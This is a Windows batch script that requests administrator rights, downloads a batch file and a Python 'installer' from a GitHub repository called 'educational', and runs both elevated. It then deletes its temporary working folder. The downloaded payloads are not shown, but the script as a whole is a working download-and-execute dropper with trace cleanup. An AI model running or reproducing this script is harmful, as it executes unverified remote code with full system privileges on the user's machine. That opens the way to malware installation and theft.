@echo off
:: Check for admin rights
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting administrative privileges...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: ---- Admin-only commands below ----

@echo off

set "WORKDIR=%TEMP%\MyTempWork"
mkdir "%WORKDIR%" 2>nul
cd /d "%WORKDIR%" || exit /b 1


set URL=https://raw.githubusercontent.com/Proutman67/educational/refs/heads/main/installpython.bat
set FILE=installpython.bat

powershell -Command "Invoke-WebRequest '%URL%' -OutFile '%FILE%'"
call "%FILE%"


echo Running as administrator
pip install requests

set URL=https://raw.githubusercontent.com/Proutman67/educational/refs/heads/main/installer.py
set DEST=installer.py

powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%DEST%'"

python "installer.py"


cd /d "%TEMP%"
del /f /q "%WORKDIR%\*.*" 2>nul
for /d %%D in ("%WORKDIR%\*") do rd /s /q "%%D"
rd "%WORKDIR%" 2>nul


pause
